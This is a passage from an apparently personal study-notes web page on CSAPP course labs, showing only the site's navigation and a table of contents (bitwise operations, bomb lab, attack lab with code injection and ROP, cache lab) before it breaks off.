
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../OSlab/">
      
      
        <link rel="next" href="../../nginx/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.18">
    
    
      
        <title>CSAPP - Richard's Notes</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.66ac8b77.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#csapp-computer-system" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Richard&#39;s Notes" class="md-header__button md-logo" aria-label="Richard's Notes" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Richard's Notes
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              CSAPP
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3 3.19.09m3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95 2.06.05m-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5c-.84 0-1.65.15-2.39.42L12 2M3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29L3.34 7m.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14L3.36 17M20.65 7l-1.77 3.79a7.023 7.023 0 0 0-2.38-4.15l4.15.36m-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29L20.64 17M12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44L12 22Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../Neetcode%20150/Binary%20Search/" class="md-tabs__link">
          
  
  Neetcode 150

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../Full%20Stack/Backend/" class="md-tabs__link">
          
  
  Full Stack

        </a>
      </li>
    
  

      
        
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../OS/" class="md-tabs__link">
          
  
  Systems

        </a>
      </li>
    
  

      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../../nginx/" class="md-tabs__link">
        
  
    
  
  nginx

      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Richard&#39;s Notes" class="md-nav__button md-logo" aria-label="Richard's Notes" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Richard's Notes
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Neetcode 150
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Neetcode 150
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Neetcode%20150/Binary%20Search/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Binary Search
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Neetcode%20150/Linked%20List/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linked List
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Neetcode%20150/Stack/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Stack
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Neetcode%20150/Trees/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Trees
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Full Stack
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Full Stack
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Full%20Stack/Backend/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Backend
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Full%20Stack/Web%20Notes/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Web Notes
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Systems
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Systems
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../OSlab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OSlab
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    CSAPP
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    CSAPP
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#lab1-data-lab-c-bitwise-operations" class="md-nav__link">
    <span class="md-ellipsis">
      Lab1 - Data Lab (C bitwise operations)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#for-lab1-data-lab1" class="md-nav__link">
    <span class="md-ellipsis">
      For lab1. Data lab1.
    </span>
  </a>
  
    <nav class="md-nav" aria-label="For lab1. Data lab1.">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#floating-point" class="md-nav__link">
    <span class="md-ellipsis">
      Floating point:
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Floating point:">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#floatfloat2intf" class="md-nav__link">
    <span class="md-ellipsis">
      floatFloat2Int(f)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#takeaway" class="md-nav__link">
    <span class="md-ellipsis">
      Takeaway:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lab2-bomb-labdisassemble-the-object-code-to-reverse-engineering-the-program" class="md-nav__link">
    <span class="md-ellipsis">
      Lab2 - Bomb Lab(Disassemble the object code to reverse engineering the program)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Lab2 - Bomb Lab(Disassemble the object code to reverse engineering the program)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#gdb-debug-tool" class="md-nav__link">
    <span class="md-ellipsis">
      GDB Debug tool
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase_1" class="md-nav__link">
    <span class="md-ellipsis">
      Phase_1
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phase_1">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ans" class="md-nav__link">
    <span class="md-ellipsis">
      Ans:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase_2" class="md-nav__link">
    <span class="md-ellipsis">
      Phase_2
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phase_2">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ans_1" class="md-nav__link">
    <span class="md-ellipsis">
      Ans:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase_3" class="md-nav__link">
    <span class="md-ellipsis">
      Phase_3
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phase_3">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#jump-table" class="md-nav__link">
    <span class="md-ellipsis">
      Jump Table
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ans_2" class="md-nav__link">
    <span class="md-ellipsis">
      Ans:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase_4" class="md-nav__link">
    <span class="md-ellipsis">
      Phase_4
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phase_4">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ans_3" class="md-nav__link">
    <span class="md-ellipsis">
      Ans:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase_5" class="md-nav__link">
    <span class="md-ellipsis">
      Phase_5
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phase_5">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ans_4" class="md-nav__link">
    <span class="md-ellipsis">
      Ans:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase_6" class="md-nav__link">
    <span class="md-ellipsis">
      Phase_6
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phase_6">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ans_5" class="md-nav__link">
    <span class="md-ellipsis">
      Ans:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lab3-attack-labcode-injection-and-rop-attack" class="md-nav__link">
    <span class="md-ellipsis">
      Lab3 - Attack lab(Code Injection and ROP attack)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Lab3 - Attack lab(Code Injection and ROP attack)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#understanding-the-rdi-register-and-parameter-passing" class="md-nav__link">
    <span class="md-ellipsis">
      Understanding the rdi Register and Parameter Passing
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase4" class="md-nav__link">
    <span class="md-ellipsis">
      Phase4
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase5" class="md-nav__link">
    <span class="md-ellipsis">
      Phase5
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lab4" class="md-nav__link">
    <span class="md-ellipsis">
      Lab4
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Lab4">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#part1" class="md-nav__link">
    <span class="md-ellipsis">
      Part1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#struct-and-typedef-in-c" class="md-nav__link">
    <span class="md-ellipsis">
      struct and typedef in c
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#lru-counter-logic" class="md-nav__link">
    <span class="md-ellipsis">
      LRU counter logic
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#part-b" class="md-nav__link">
    <span class="md-ellipsis">
      Part B:
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Part B:">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#32-x-32" class="md-nav__link">
    <span class="md-ellipsis">
      32 x 32
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#memory-address-to-cache-index-mapping" class="md-nav__link">
    <span class="md-ellipsis">
      Memory Address to Cache Index Mapping
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-calculation-address-and-index-for-akk" class="md-nav__link">
    <span class="md-ellipsis">
      Example Calculation: Address and Index for A[k][k]
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-calculation-address-and-index-for-bkk" class="md-nav__link">
    <span class="md-ellipsis">
      Example Calculation: Address and Index for B[k][k]
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#simplifying-the-index-calculation" class="md-nav__link">
    <span class="md-ellipsis">
      Simplifying the Index Calculation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#conclusion" class="md-nav__link">
    <span class="md-ellipsis">
      Conclusion
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cache-conflict-explanation" class="md-nav__link">
    <span class="md-ellipsis">
      Cache Conflict Explanation
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Cache Conflict Explanation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#64-x-64" class="md-nav__link">
    <span class="md-ellipsis">
      64 x 64
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../nginx/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    nginx
  </span>
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#lab1-data-lab-c-bitwise-operations" class="md-nav__link">
    <span class="md-ellipsis">
      Lab1 - Data Lab (C bitwise operations)
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#for-lab1-data-lab1" class="md-nav__link">
    <span class="md-ellipsis">
      For lab1. Data lab1.
    </span>
  </a>
  
    <nav class="md-nav" aria-label="For lab1. Data lab1.">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#floating-point" class="md-nav__link">
    <span class="md-ellipsis">
      Floating point:
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Floating point:">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#floatfloat2intf" class="md-nav__link">
    <span class="md-ellipsis">
      floatFloat2Int(f)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#takeaway" class="md-nav__link">
    <span class="md-ellipsis">
      Takeaway:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lab2-bomb-labdisassemble-the-object-code-to-reverse-engineering-the-program" class="md-nav__link">
    <span class="md-ellipsis">
      Lab2 - Bomb Lab(Disassemble the object code to reverse engineering the program)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Lab2 - Bomb Lab(Disassemble the object code to reverse engineering the program)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#gdb-debug-tool" class="md-nav__link">
    <span class="md-ellipsis">
      GDB Debug tool
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase_1" class="md-nav__link">
    <span class="md-ellipsis">
      Phase_1
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phase_1">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ans" class="md-nav__link">
    <span class="md-ellipsis">
      Ans:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase_2" class="md-nav__link">
    <span class="md-ellipsis">
      Phase_2
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phase_2">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ans_1" class="md-nav__link">
    <span class="md-ellipsis">
      Ans:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase_3" class="md-nav__link">
    <span class="md-ellipsis">
      Phase_3
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phase_3">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#jump-table" class="md-nav__link">
    <span class="md-ellipsis">
      Jump Table
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ans_2" class="md-nav__link">
    <span class="md-ellipsis">
      Ans:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase_4" class="md-nav__link">
    <span class="md-ellipsis">
      Phase_4
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phase_4">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ans_3" class="md-nav__link">
    <span class="md-ellipsis">
      Ans:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase_5" class="md-nav__link">
    <span class="md-ellipsis">
      Phase_5
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phase_5">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ans_4" class="md-nav__link">
    <span class="md-ellipsis">
      Ans:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase_6" class="md-nav__link">
    <span class="md-ellipsis">
      Phase_6
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Phase_6">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#ans_5" class="md-nav__link">
    <span class="md-ellipsis">
      Ans:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lab3-attack-labcode-injection-and-rop-attack" class="md-nav__link">
    <span class="md-ellipsis">
      Lab3 - Attack lab(Code Injection and ROP attack)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Lab3 - Attack lab(Code Injection and ROP attack)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#understanding-the-rdi-register-and-parameter-passing" class="md-nav__link">
    <span class="md-ellipsis">
      Understanding the rdi Register and Parameter Passing
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase4" class="md-nav__link">
    <span class="md-ellipsis">
      Phase4
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#phase5" class="md-nav__link">
    <span class="md-ellipsis">
      Phase5
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    <span class="md-ellipsis">
      References:
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lab4" class="md-nav__link">
    <span class="md-ellipsis">
      Lab4
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Lab4">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#part1" class="md-nav__link">
    <span class="md-ellipsis">
      Part1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#struct-and-typedef-in-c" class="md-nav__link">
    <span class="md-ellipsis">
      struct and typedef in c
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#lru-counter-logic" class="md-nav__link">
    <span class="md-ellipsis">
      LRU counter logic
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#part-b" class="md-nav__link">
    <span class="md-ellipsis">
      Part B:
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Part B:">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#32-x-32" class="md-nav__link">
    <span class="md-ellipsis">
      32 x 32
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#memory-address-to-cache-index-mapping" class="md-nav__link">
    <span class="md-ellipsis">
      Memory Address to Cache Index Mapping
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-calculation-address-and-index-for-akk" class="md-nav__link">
